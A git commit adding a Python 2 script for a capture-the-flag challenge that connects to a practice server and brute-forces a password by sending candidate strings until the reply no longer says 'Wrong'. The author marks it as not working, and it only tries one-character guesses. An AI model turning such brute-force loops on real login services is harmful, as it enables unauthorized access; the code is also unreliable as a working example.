70653384dddc549c093b545265b4f730400b9390
f00ker <memoi2001@fooker.fr>
2016-03-24 21:15:31 +0100

    Doesn't work

---
+++ challenge66.py
@@ -0,0 +1,41 @@
+import itertools
+import socket
+
+"""
+DOESN'T WORK
+"""
+
+def bruteforce(charset, maxlength):
+    return (''.join(candidate)
+        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
+        for i in range(1, maxlength + 1)))
+
+def netcat(hostname, port, content):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((hostname, port))
+    s.sendall(content)
+    s.shutdown(socket.SHUT_WR)
+    while 1:
+        data = s.recv(1024)
+        if data == "":
+            break
+        print "Received:", repr(data)
+    print "Connection closed."
+    s.close()
+
+
+if __name__ == '__main__':
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("ringzer0team.com",60000))
+    s.sendall("0")
+    data = s.recv(9999)
+    for password in bruteforce('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',1):
+        print password
+        s.sendall("00000" + password)
+        data = s.recv(9999)
+
+        print data
+        if not "Wrong" in data:
+            print data
+            s.close()
+            break
